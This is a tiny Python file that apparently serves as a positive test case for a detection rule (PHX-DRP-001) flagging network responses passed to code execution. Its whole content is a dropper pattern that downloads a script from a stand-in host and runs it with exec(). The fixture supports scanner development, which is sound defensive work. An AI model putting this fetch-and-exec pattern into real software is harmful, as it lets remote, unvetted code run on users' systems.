"""PHX-DRP-001 positive: NetworkResponse -> CodeExecution.

The classic second-stage dropper: fetch a body, hand it straight to exec.
"""
import urllib.request

_response = urllib.request.urlopen("http://stage2.example.invalid/payload.py")
_body = _response.read().decode("utf-8")
exec(_body)
